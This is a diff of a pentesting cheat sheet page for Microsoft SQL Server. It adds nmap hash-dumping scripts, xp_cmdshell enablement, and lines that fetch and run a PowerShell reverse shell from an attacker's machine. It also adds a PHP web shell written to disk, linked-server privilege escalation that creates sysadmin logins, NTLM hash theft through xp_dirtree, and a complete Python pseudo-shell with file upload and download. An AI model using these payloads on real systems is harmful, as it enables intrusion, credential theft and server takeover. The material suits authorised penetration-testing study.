@@ -104,6 +104,21 @@
 
 <h2>Commands</h2>
 
+<h3>Nmap commands</h3>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Dump password hashes from MSSQL instance if we</span>
+<span class="c"># have the appropriate privileges:</span>
+nmap <span class="nt">-v</span> <span class="nt">-sT</span> <span class="nt">-p</span> &lt;MSSQL port&gt; <span class="nt">--script</span><span class="o">=</span>MSSQL-dump-hashes.nse <span class="nt">--script-args</span><span class="o">=</span><span class="s1">'mssql.username=&lt;username&gt;,mssql.password=&lt;password&gt;'</span> &lt;IP&gt;
+
+<span class="c"># Try to connect with blank password for sa:</span>
+nmap <span class="nt">-v</span> <span class="nt">-sT</span> <span class="nt">-p</span> &lt;MSSQL port&gt; <span class="nt">--script</span><span class="o">=</span>MSSQL-empty-password.nse &lt;hosts&gt;
+
+<span class="c"># Scan MSSQL server with nmap:</span>
+<span class="nb">sudo </span>nmap <span class="nt">--script</span> ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes <span class="nt">--script-args</span> mssql.instance-port<span class="o">=</span>1433,mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>,mssql.instance-name<span class="o">=</span>MSSQLSERVER <span class="nt">-sV</span> <span class="nt">-p</span> 1433 &lt;IP address&gt;
+</code></pre></div>
+
+<h3>MSSQL database login</h3>
+
 <div class="highlight"><pre class="highlight shell"><code><span class="c"># Connect to MSSQL on Linux with SQL authentication:</span>
 sqsh <span class="nt">-S</span> &lt;IP address&gt; <span class="nt">-U</span> &lt;username&gt; <span class="nt">-P</span> &lt;password&gt;
 
@@ -111,51 +126,106 @@ sqsh <span class="nt">-S</span> &lt;IP address&gt; <span class="nt">-U</span> &l
 <span class="c"># the .\\ notation is used for a local account</span>
 sqsh <span class="nt">-S</span> &lt;IP address&gt; <span class="nt">-U</span> .<span class="se">\\</span>&lt;username&gt; <span class="nt">-P</span> &lt;password&gt;
 
-<span class="c"># Connect to MSSQL on Windows:</span>
+<span class="c"># Connect to MSSQL on Windows. Remember that</span>
+<span class="c"># you must append 'GO' after commands to execute them:</span>
 sqlcmd <span class="nt">-S</span> &lt;IP address&gt; <span class="nt">-U</span> &lt;username&gt; <span class="nt">-P</span> &lt;password&gt;
 
+<span class="c"># Connect with mssqlclient.py from impacket.</span>
+<span class="c"># Provides handy commands for privesc and enumeration.</span>
+<span class="c"># The '-windows-auth' flag might be needed, too:</span>
+mssqlclient.py <span class="s1">'&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;IP&gt;'</span>
+</code></pre></div>
+
+<h3>Basic commands</h3>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Get MSSQL version:</span>
+SELECT @@version
+
+<span class="c"># Get username:</span>
+<span class="k">select </span>user_name<span class="o">()</span>
+<span class="k">select </span>current_user
+
+<span class="c"># List all users in current database:</span>
+<span class="k">select </span>name, create_date, modify_date, type_desc, authentication_type_desc from sys.database_principals order by create_date desc
+
+<span class="c"># Get current database:</span>
+<span class="k">select </span>db_name<span class="o">()</span>
+
 <span class="c"># List all databases:</span>
-<span class="k">select </span>name from sys.databases<span class="p">;</span>
+<span class="k">select </span>name from sys.databases
 
 <span class="c"># List all tables from a database:</span>
-<span class="k">select </span>table_name from &lt;database name&gt;.information_schema.tables<span class="p">;</span>
+<span class="k">select </span>table_name from &lt;database name&gt;.information_schema.tables
 
 <span class="c"># Dump data from a table:</span>
-<span class="k">select</span> <span class="k">*</span> from &lt;database name&gt;..&lt;table name&gt;<span class="p">;</span>
+<span class="k">select</span> <span class="k">*</span> from &lt;database name&gt;..&lt;table name&gt;
 
-<span class="c"># In MSSQL prompt, execute system commands with xp_cmdshell.</span>
+<span class="c"># Get login identification name:</span>
+<span class="k">select </span>system_user
+<span class="k">select </span>loginame from master..sysprocesses where spid <span class="o">=</span> @@SPID
+</code></pre></div>
+
+<h3>Enumeration commands</h3>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Check if current user is either</span>
+<span class="c"># sysadmin of serveradmin:</span>
+<span class="k">select </span>is_srvrolemember<span class="o">(</span><span class="s1">'sysadmin'</span><span class="o">)</span>
+<span class="k">select </span>is_srvrolemember<span class="o">(</span><span class="s1">'serveradmin'</span><span class="o">)</span>
+
+<span class="c"># Check permissions of current user:</span>
+<span class="k">select </span>entity_name, permission_name from sys.fn_my_permissions<span class="o">(</span>NULL, NULL<span class="o">)</span>
+
+<span class="c"># Check if any user is either</span>
+<span class="c"># sysadmin or serveradmin:</span>
+<span class="k">select </span>is_srvrolemember<span class="o">(</span><span class="s1">'sysadmin'</span>, <span class="s1">'&lt;username&gt;'</span><span class="o">)</span>
+<span class="k">select </span>is_srvrolemember<span class="o">(</span><span class="s1">'serveradmin'</span>, <span class="s1">'&lt;username&gt;'</span><span class="o">)</span>
+
+<span class="c"># List users with sysadmin role:</span>
+<span class="nb">exec </span>sp_helpsrvrolemember @srvrolename<span class="o">=</span><span class="s1">'sysadmin'</span>
+<span class="k">select</span> <span class="s1">'Name'</span> <span class="o">=</span> sp.NAME,sp.is_disabled as <span class="o">[</span>Is_disabled] from sys.server_role_members <span class="nb">rm </span>inner <span class="nb">join </span>sys.server_principals sp on rm.member_principal_id <span class="o">=</span> sp.principal_id where rm.role_principal_id <span class="o">=</span> SUSER_ID<span class="o">(</span><span class="s1">'sysadmin'</span><span class="o">)</span>
+
+<span class="c"># List users with either sysadmin role or 'Control Server' permission:</span>
+<span class="k">select </span>distinct p.name as <span class="o">[</span>loginname], p.type, p.type_desc, p.is_disabled, s.sysadmin, convert<span class="o">(</span>varchar<span class="o">(</span>10<span class="o">)</span>, p.create_date ,101<span class="o">)</span> as <span class="o">[</span>created],convert<span class="o">(</span>varchar<span class="o">(</span>10<span class="o">)</span>, p.modify_date, 101<span class="o">)</span> as <span class="o">[</span>update] from sys.server_principals p <span class="nb">join </span>sys.syslogins s on p.sid <span class="o">=</span> s.sid <span class="nb">join </span>sys.server_permissions sp on p.principal_id <span class="o">=</span> sp.grantee_principal_id where p.type_desc <span class="k">in</span> <span class="o">(</span><span class="s1">'SQL_LOGIN'</span>, <span class="s1">'WINDOWS_LOGIN'</span>, <span class="s1">'WINDOWS_GROUP'</span><span class="o">)</span> and p.name not like <span class="s1">'##%'</span> and <span class="o">(</span>s.sysadmin <span class="o">=</span> 1 OR sp.permission_name <span class="o">=</span> <span class="s1">'CONTROL SERVER'</span><span class="o">)</span> order by p.name
+
+<span class="c"># List roles of specified user:</span>
+<span class="k">select </span>u.name, r.name from sys.database_role_members as m inner <span class="nb">join </span>sys.database_principals as r on m.role_principal_id <span class="o">=</span> r.principal_id inner <span class="nb">join </span>sys.database_principals as u on u.principal_id <span class="o">=</span> m.member_principal_id where u.name <span class="o">=</span> <span class="s1">'&lt;username&gt;'</span><span class="p">;</span>
+
+<span class="c"># List roles of all users in current database:</span>
+<span class="k">select </span>db_name<span class="o">()</span>, r.[name], p.[name] from sys.database_role_members m <span class="nb">join </span>sys.database_principals r on m.role_principal_id <span class="o">=</span> r.principal_id <span class="nb">join </span>sys.database_principals p on m.member_principal_id <span class="o">=</span> p.principal_id<span class="p">;</span>
+
+<span class="c"># Map database roles to users:</span>
+<span class="k">select </span>DP1.name as DatabaseRoleName, isnull <span class="o">(</span>DP2.name, <span class="s1">'No members'</span><span class="o">)</span> as DatabaseUserName from sys.database_role_members as DRM right outer <span class="nb">join </span>sys.database_principals as DP1 on DRM.role_principal_id <span class="o">=</span> DP1.principal_id left outer <span class="nb">join </span>sys.database_principals as DP2 on DRM.member_principal_id <span class="o">=</span> DP2.principal_id where DP1.type <span class="o">=</span> <span class="s1">'R'</span> order by DP1.name<span class="p">;</span>
+</code></pre></div>
+
+<h3>Executing system commands and writing files</h3>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># In MSSQL prompt, execute system commands with xp_cmdshell.</span>
 <span class="c"># This is rarely enabled but worth a try:</span>
 xp_cmdshell <span class="s1">'whoami'</span>
-GO <span class="c"># necessary to process commands with sqlcmd</span>
 
-<span class="c">############</span>
 <span class="c"># If xp_cmdshell is not enabled while we have the proper permissions</span>
-<span class="c"># to change that, enable it:</span>
+<span class="c"># to change that, enable it.</span>
 
 <span class="c"># Allow advanced options to be changed</span>
 <span class="c"># and enable xp_cmdshell:</span>
 EXECUTE sp_configure <span class="s1">'show advanced options'</span>, 1
-GO
 RECONFIGURE
-GO
 EXECUTE sp_configure <span class="s1">'xp_cmdshell'</span>, 1
-GO
 RECONFIGURE
-GO
-<span class="c">############</span>
 
-<span class="c">############</span>
-<span class="c"># Enable writing files with MSSQL if you have admin privileges:</span>
+<span class="c"># Execute Invoke-PowerShellTcp.ps1 reverse shell with xp_cmdshell:</span>
+EXEC xp_cmdshell <span class="s2">"powershell IEX (New-Object Net.WebClient).DownloadString('http://&lt;attack box IP&gt;:&lt;attack box port&gt;/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress &lt;attack box IP&gt; -Port &lt;attack box port&gt;;"</span>
 
+<span class="c"># Alternatively, by adding the Invoke-PowerShellTcp command at</span>
+<span class="c"># the end of the script:</span>
+EXEC xp_cmdshell <span class="s2">"powershell IEX (New-Object Net.WebClient).DownloadString('http://&lt;attack box IP&gt;:&lt;attack box port&gt;/Invoke-PowerShellTcp.ps1')"</span>
+
+<span class="c"># Enable writing files with MSSQL if you have admin privileges.</span>
 <span class="c"># For this, enable ole automation procedures:</span>
 sp_configure <span class="s1">'show advanced options'</span>, 1
-GO
 RECONFIGURE
-GO
 sp_configure <span class="s1">'Ole Automation Procedures'</span>, 1
-GO
 RECONFIGURE
-GO
 
 <span class="c"># Then, create a file.</span>
 <span class="c"># A very simple and easy to remember process!</span>
@@ -166,11 +236,14 @@ EXECUTE sp_OAMethod @OLE, <span class="s1">'OpenTextFile'</span>, @FileID OUT, <
 EXECUTE sp_OAMethod @FileID, <span class="s1">'WriteLine'</span>, Null, <span class="s1">'&lt;?php echo shell_exec($_GET["c"]);?&gt;'</span>
 EXECUTE sp_OADestroy @FileID
 EXECUTE sp_OADestroy @OLE
-GO
-<span class="c">############</span>
 
-<span class="c">############</span>
-<span class="c"># Leveraging the impersonate permission, which allows</span>
+<span class="c"># Read files with MSSQL, according to your system permissions:</span>
+SELECT <span class="k">*</span> FROM OPENROWSET<span class="o">(</span>BULK N<span class="s1">'C:/&lt;path&gt;'</span>, SINGLE_CLOB<span class="o">)</span>
+</code></pre></div>
+
+<h3>IMPERSONATE permission</h3>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Leveraging the impersonate permission, which allows</span>
 <span class="c"># you to take the permissions of another user. What</span>
 <span class="c"># could possibly go wrong?</span>
 
@@ -180,59 +253,279 @@ FROM sys.server_permissions a
 INNER JOIN sys.server_principals b
 ON a.grantor_principal_id <span class="o">=</span> b.principal_id
 WHERE a.permission_name <span class="o">=</span> <span class="s1">'IMPERSONATE'</span>
-GO
 
 <span class="c"># Verify current user and associated role:</span>
 SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER<span class="o">(</span><span class="s1">'sysadmin'</span><span class="o">)</span>
-GO
 
 <span class="c"># Impersonate a user.</span>
 <span class="c"># Run this within the master DB,</span>
 <span class="c"># as everyone as access to it:</span>
 EXECUTE AS LOGIN <span class="o">=</span> <span class="s1">'&lt;username&gt;'</span>
+<span class="c"># Or:</span>
+EXECUTE AS LOGIN <span class="o">=</span> <span class="s1">'&lt;domain&gt;\\&lt;login&gt;'</span><span class="p">;</span>
 SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER<span class="o">(</span><span class="s1">'sysadmin'</span><span class="o">)</span>
-GO
+
+<span class="c"># Switch the execution to the specified user:</span>
+EXECUTE AS USER <span class="o">=</span> <span class="s1">'&lt;username&gt;'</span><span class="p">;</span>
 
 <span class="c"># Use REVERT to quit impersonation:</span>
 REVERT
-GO
-<span class="c">############</span>
+</code></pre></div>
 
-<span class="c">############</span>
-<span class="c"># Leveraging the linked servers configuration, which</span>
+<h3>Leveraging linked servers configuration</h3>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Leveraging the linked servers configuration, which</span>
 <span class="c"># allows you to execute statements to external, but</span>
 <span class="c"># linked SQL servers or other database products.</span>
 <span class="c"># What could possibly go wrong?</span>
 
 <span class="c"># Identify linked servers in MSSQL:</span>
 SELECT srvname, isremote FROM sysservers
-GO
+
+<span class="c"># Alternative command to list linked servers:</span>
+SELECT srvname from master..sysservers
+
+<span class="c"># Check if RPC is enabled on linked server:</span>
+EXEC <span class="o">(</span><span class="s1">'master.dbo.sp_helpdb'</span><span class="o">)</span> AT <span class="o">[</span>&lt;HOSTNAME or IP&gt;<span class="se">\&lt;</span>INSTANCE&gt;]
 
 <span class="c"># Identify the user used for the connection between</span>
 <span class="c"># the servers:</span>
 EXECUTE<span class="o">(</span><span class="s1">'select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')'</span><span class="o">)</span> AT <span class="o">[</span>&lt;IP address&gt;<span class="se">\&lt;</span>server name&gt;]
-GO
-<span class="c">############</span>
 
-<span class="c"># Read file with MSSQL, according to your system permissions:</span>
-SELECT <span class="k">*</span> FROM OPENROWSET<span class="o">(</span>BULK N<span class="s1">'C:/&lt;path&gt;'</span>, SINGLE_CLOB<span class="o">)</span>
-GO
+<span class="c"># Alternative commands for login recon:</span>
+SELECT <span class="k">*</span> FROM OPENQUERY<span class="o">(</span><span class="s2">"&lt;HOSTNAME or IP&gt;</span><span class="se">\&lt;</span><span class="s2">INSTANCE&gt;"</span>, <span class="s1">'SELECT SYSTEM_USER'</span><span class="o">)</span>
+SELECT <span class="k">*</span> FROM OPENQUERY<span class="o">(</span><span class="s2">"&lt;HOSTNAME or IP&gt;</span><span class="se">\&lt;</span><span class="s2">INSTANCE&gt;"</span>, <span class="s1">'SELECT is_srvrolemember(''sysadmin'')'</span><span class="o">)</span>
 
-<span class="c"># Scan MSSQL server with nmap:</span>
-<span class="nb">sudo </span>nmap <span class="nt">--script</span> ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes <span class="nt">--script-args</span> mssql.instance-port<span class="o">=</span>1433,mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>,mssql.instance-name<span class="o">=</span>MSSQLSERVER <span class="nt">-sV</span> <span class="nt">-p</span> 1433 &lt;IP address&gt;
+<span class="c"># List linked servers of the specified linked server:</span>
+SELECT <span class="k">*</span> FROM OPENQUERY<span class="o">(</span><span class="s2">"&lt;HOSTNAME OR IP&gt;</span><span class="se">\&lt;</span><span class="s2">INSTANCE&gt;"</span>, <span class="s1">'SELECT srvname from master..sysservers'</span><span class="o">)</span>
 
-<span class="c"># Login with mssqlclient.py:</span>
-python3 mssqlclient.py &lt;username&gt;@&lt;IP address&gt; <span class="nt">-windows-auth</span>
+<span class="c"># Enumerate linked servers of the specified linked server:</span>
+SELECT <span class="k">*</span> FROM OPENQUERY<span class="o">(</span><span class="s2">"&lt;HOSTNAME1 OR IP1&gt;</span><span class="se">\&lt;</span><span class="s2">INSTANCE1&gt;"</span>, <span class="s1">'SELECT * FROM OPENQUERY("&lt;HOSTNAME2 OR IP2&gt;\&lt;INSTANCE2&gt;", ''SELECT is_srvrolemember(''''sysadmin'''')'')'</span><span class="o">)</span>
+
+<span class="c"># Alternative command for linked servers of linked server</span>
+<span class="c"># enumeration:</span>
+EXEC <span class="o">(</span><span class="s1">'EXEC (''SELECT is_srvrolemember(''''sysadmin'''')'') AT [&lt;HOSTNAME2 OR IP2&gt;\&lt;INSTANCE2&gt;];'</span><span class="o">)</span> AT <span class="o">[</span>&lt;HOSTNAME1 OR IP1&gt;<span class="se">\&lt;</span>INSTANCE1&gt;]
+
+<span class="c"># Create user on linked server and give it the sysadmin role:</span>
+EXEC <span class="o">(</span><span class="s1">'CREATE LOGIN &lt;USERNAME&gt; WITH PASSWORD = ''&lt;PASSWORD&gt;'';'</span><span class="o">)</span> AT <span class="o">[</span>&lt;HOSTNAME OR IP&gt;<span class="se">\&lt;</span>INSTANCE&gt;]
+EXEC <span class="o">(</span><span class="s1">'EXEC master.dbo.sp_addsrvrolemember ''&lt;USERNAME&gt;'',''sysadmin'';'</span><span class="o">)</span> AT <span class="o">[</span>&lt;HOSTNAME OR IP&gt;<span class="se">\&lt;</span>INSTANCE&gt;]
+
+<span class="c"># Created user on linked server of linked server and</span>
+<span class="c"># give it the sysadmin role:</span>
+EXEC <span class="o">(</span><span class="s1">'EXEC (''CREATE LOGIN &lt;USERNAME&gt; WITH PASSWORD = ''''&lt;PASSWORD&gt;'''''') AT [&lt;HOSTNAME2 OR IP2&gt;\&lt;INSTANCE2&gt;];'</span><span class="o">)</span> AT <span class="o">[</span>&lt;HOSTNAME1 OR IP1&gt;<span class="se">\&lt;</span>INSTANCE1&gt;]
+EXEC <span class="o">(</span><span class="s1">'EXEC (''EXEC master.dbo.sp_addsrvrolemember ''''&lt;USERNAME&gt;'''',''''sysadmin'''''') AT [&lt;HOSTNAME2 OR IP2&gt;\&lt;INSTANCE2&gt;];'</span><span class="o">)</span> AT <span class="o">[</span>&lt;HOSTNAME1 OR IP1&gt;<span class="se">\&lt;</span>INSTANCE1&gt;]
+
+<span class="c"># Use xp_cmdshell on linked server:</span>
+EXEC <span class="o">(</span><span class="s1">'xp_cmdshell ''&lt;CMD&gt;'''</span><span class="o">)</span> AT <span class="o">[</span>&lt;HOSTNAME1 OR IP1&gt;<span class="se">\&lt;</span>INSTANCE1&gt;]
+
+<span class="c"># Alternative command if we get no output:</span>
+SELECT <span class="k">*</span> FROM OPENQUERY<span class="o">(</span><span class="s2">"[&lt;HOSTNAME OR IP&gt;</span><span class="se">\&lt;</span><span class="s2">INSTANCE&gt;]"</span>,<span class="s1">'SELECT 1; EXEC master..xp_cmdshell ''&lt;CMD&gt;'''</span><span class="o">)</span>
+
+<span class="c"># Use xp_cmdshell on linked server of linked server:</span>
+EXEC <span class="o">(</span><span class="s1">'EXEC (''xp_cmdshell ''''&lt;CMD&gt;'''''') AT [&lt;HOSTNAME2 OR IP2&gt;\&lt;INSTANCE2&gt;];'</span><span class="o">)</span> AT <span class="o">[</span>&lt;HOSTNAME1 OR IP1&gt;<span class="se">\&lt;</span>INSTANCE1&gt;]
+
+<span class="c"># Alternative command if we get no output:</span>
+SELECT <span class="k">*</span> FROM OPENQUERY<span class="o">(</span><span class="s2">"[&lt;HOSTNAME1 OR IP1&gt;</span><span class="se">\&lt;</span><span class="s2">INSTANCE1&gt;]"</span>, <span class="s1">'SELECT * FROM OPENQUERY("[&lt;HOSTNAME2 OR IP2&gt;\&lt;INSTANCE2&gt;]", ''xp_cmdshell &lt;CMD&gt;;'')'</span><span class="o">)</span><span class="p">;</span>
+</code></pre></div>
+
+<h3>Stealing hashes with SMB share or responder</h3>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Start a SMB share on your machine:</span>
+impacket-smbserver <span class="nt">-smb2support</span> share <span class="nb">.</span>
+
+<span class="c"># Alternatively, responder can be used:</span>
+<span class="nb">sudo </span>responder <span class="nt">-I</span> &lt;interface&gt;
 
 <span class="c"># With responder or impacket-smbserver listening, steal MSSQL service hash:</span>
-EXEC master..xp_dirtree <span class="s1">'\\&lt;IP address&gt;\share\'</span>
-GO
+EXEC master..xp_dirtree <span class="s1">'\\&lt;our IP address&gt;\share\'</span>
 
 <span class="c"># Or alternatively:</span>
-EXEC master..xp_subdirs <span class="s1">'\\&lt;IP address&gt;\share\'</span>
-GO
+EXEC master..xp_subdirs <span class="s1">'\\&lt;our IP address&gt;\share\'</span>
+</code></pre></div>
+
+<h3>Python2 pseudo shell</h3>
+
+<p>This pseudo shell leverages only xp_cmdshell, which can be useful on constrained environments:</p>
+
+<div class="highlight"><pre class="highlight plaintext"><code>#!/usr/bin/env python2
+from __future__ import print_function
+
+# Author: Alamot
+# Download functionality: Qazeer
+# Use pymssql &gt;= 1.0.3 (otherwise it doesn't work correctly)
+# To upload a file, type: UPLOAD local_path remote_path
+# e.g. UPLOAD myfile.txt C:\temp\myfile.txt
+# If you omit the remote_path it uploads the file on the current working folder.
+# To dowload a file from the remote host, type: DOWNLOAD remote_path [local_path]
+# e.g. DOWNLOAD myfile.txt
+# Or DOWNLOAD remotefile.txt /tmp/file.txt
+# Be aware that pymssql has some serious memory leak issues when the connection fails (see: https://github.com/pymssql/pymssql/issues/512).
+import _mssql
+import base64
+import ntpath
+import os
+import random
+import shlex
+import string
+import sys
+import tqdm
+import hashlib
+from io import open
+try: input = raw_input
+except NameError: pass
+
+MSSQL_SERVER = '&lt;IP&gt;'
+MSSQL_USERNAME = '&lt;USERNAME&gt;'
+MSSQL_PASSWORD = '&lt;PASSWORD&gt;'
+BUFFER_SIZE = 5*1024
+TIMEOUT = 30
+
+
+def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
+    return ''.join(random.choice(chars) for _ in range(size))
+
+
+def process_result(mssql):
+    username = ""
+    computername = ""
+    cwd = ""
+    rows = list(mssql)
+    for row in rows[:-3]:
+        columns = row.keys()
+        print(row[columns[-1]])
+    if len(rows) &gt;= 3:
+        (username, computername) = rows[-3][rows[-3].keys()[-1]].split('|')
+        cwd = rows[-2][rows[-3].keys()[-1]]
+    return (username.rstrip(), computername.rstrip(), cwd.rstrip())
+
+
+def upload(mssql, stored_cwd, local_path, remote_path):
+    print("Uploading "+local_path+" to "+remote_path)
+    cmd = 'type nul &gt; "' + remote_path + '.b64"'
+    mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
+
+    with open(local_path, 'rb') as f:
+        data = f.read()
+        md5sum = hashlib.md5(data).hexdigest()
+        b64enc_data = "".join(base64.encodestring(data).split())
+
+    print("Data length (b64-encoded): "+str(len(b64enc_data)/1024)+"KB")
+    for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit_scale=BUFFER_SIZE/1024, unit="KB"):
+        cmd = 'echo '+b64enc_data[i:i+BUFFER_SIZE]+' &gt;&gt; "' + remote_path + '.b64"'
+        mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
+        #print("Remaining: "+str(len(b64enc_data)-i))
+
+    cmd = 'certutil -decode "' + remote_path + '.b64" "' + remote_path + '"'
+    mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" &amp; "+cmd+" &amp; echo %username%^|%COMPUTERNAME% &amp; cd'")
+    process_result(mssql)
+    cmd = 'certutil -hashfile "' + remote_path + '" MD5'
+    mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" &amp; "+cmd+" &amp; echo %username%^|%COMPUTERNAME% &amp; cd'")
+    if md5sum in [row[row.keys()[-1]].strip() for row in mssql if row[row.keys()[-1]]]:
+        print("MD5 hashes match: " + md5sum)
+    else:
+        print("ERROR! MD5 hashes do NOT match!")
+
+
+def dowload(mssql, stored_cwd, remote_path, local_path=""):
+    try:
+        remote_path = remote_path.replace('"', '').replace('\'', '')
+        if local_path == "":
+            local_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), ntpath.basename(remote_path))
+
+        print("Downloading " + remote_path + " to " + local_path)
+
+        tmp_filename = '%TEMP%\\' + id_generator() + ".b64"
+        cmd = 'del "' + tmp_filename + '"'
+        mssql.execute_query("EXEC xp_cmdshell '" + cmd + "'")
+
+        cmd = 'certutil -encode "' + remote_path + '" "' + tmp_filename + '"'
+        mssql.execute_query("EXEC xp_cmdshell 'cd " + stored_cwd + " &amp; " + cmd + " &amp; echo %username%^|%COMPUTERNAME% &amp; cd'")
+
+        cmd = 'type "' + tmp_filename + '"'
+        mssql.execute_query("EXEC xp_cmdshell 'cd " + stored_cwd + " &amp; " + cmd + " &amp; echo %username%^|%COMPUTERNAME% &amp; cd'")
+
+        certutil_result = list(mssql)
+
+        if "CERTIFICATE-----" not in str(certutil_result[0][0]):
+            raise Exception("ERROR! Encoding with Certutil failed!")
+
+        file_b64 = ""
+        for row in certutil_result[1:-4]:
+            columns = list(row)
+            file_b64 += row[columns[-1]]
+
+        with open(local_path, 'wb') as f:
+            data = base64.b64decode(file_b64, None)
+            md5sum = hashlib.md5(data).hexdigest()
+            f.write(data)
+
+        tmp_filename = '%TEMP%\\' + tmp_filename + ".b64"
+        cmd = 'del "' + tmp_filename + '"'
+        mssql.execute_query("EXEC xp_cmdshell '" + cmd + "'")
+
+        cmd = 'certutil -hashfile "' + remote_path + '" MD5'
+        mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" &amp; "+cmd+" &amp; echo %username%^|%COMPUTERNAME% &amp; cd'")
+        if md5sum in [row[row.keys()[-1]].strip() for row in mssql if row[row.keys()[-1]]]:
+            print("MD5 hashes match: " + md5sum)
+        else:
+            Exception("ERROR! MD5 hashes do NOT match!")
+
+        return "echo *** DOWNLOAD PROCEDURE FINISHED ***"
+
+    except Exception as e:
+        return "echo *** ERROR WHILE DOWNLOADING THE FILE: " + e + " ***"
+
+
+def shell():
+    mssql = None
+    stored_cwd = None
+    try:
+        mssql = _mssql.connect(server=MSSQL_SERVER, user=MSSQL_USERNAME, password=MSSQL_PASSWORD)
+        print("Successful login: "+MSSQL_USERNAME+"@"+MSSQL_SERVER)
+
+        print("Trying to enable xp_cmdshell ...")
+        mssql.execute_query("EXEC sp_configure 'show advanced options',1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell',1;RECONFIGURE")
+
+        cmd = 'echo %username%^|%COMPUTERNAME% &amp; cd'
+        mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
+        (username, computername, cwd) = process_result(mssql)
+        stored_cwd = cwd
+
+        while True:
+            cmd = raw_input("CMD "+username+"@"+computername+" "+cwd+"&gt; ").rstrip("\n").replace("'", "''")
+            if cmd.lower()[0:4] == "exit":
+                mssql.close()
+                return
+            elif cmd[0:6] == "UPLOAD":
+                upload_cmd = shlex.split(cmd, posix=False)
+                if len(upload_cmd) &lt; 3:
+                    upload(mssql, stored_cwd, upload_cmd[1], stored_cwd+"\\"+upload_cmd[1])
+                else:
+                    upload(mssql, stored_cwd, upload_cmd[1], upload_cmd[2])
+                cmd = "echo *** UPLOAD PROCEDURE FINISHED ***"
+            elif cmd[0:8] == "DOWNLOAD":
+                dowload_cmd = shlex.split(cmd, posix=False)
+                if len(dowload_cmd) &lt; 3:
+                    cmd = dowload(mssql, stored_cwd, dowload_cmd[1])
+                else:
+                    cmd = dowload(mssql, stored_cwd, dowload_cmd[1], dowload_cmd[2])
+            mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" &amp; "+cmd+" &amp; echo %username%^|%COMPUTERNAME% &amp; cd'")
+            (username, computername, cwd) = process_result(mssql)
+            stored_cwd = cwd
+
+    except _mssql.MssqlDatabaseException as e:
+        if  e.severity &lt;= 16:
+            print("MSSQL failed: "+str(e))
+        else:
+            raise
+    finally:
+        if mssql:
+            mssql.close()
+
+shell()
+sys.exit()
 </code></pre></div>
 
 <h2>References</h2>
@@ -240,6 +533,7 @@ GO
 <ul>
 <li><a href="https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15" rel="nofollow">https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15</a></li>
 <li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server" rel="nofollow">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server</a></li>
+<li><a href="https://notes.qazeer.io/l7/methodology-14" rel="nofollow">https://notes.qazeer.io/l7/methodology-14</a></li>
 </ul>
 
     
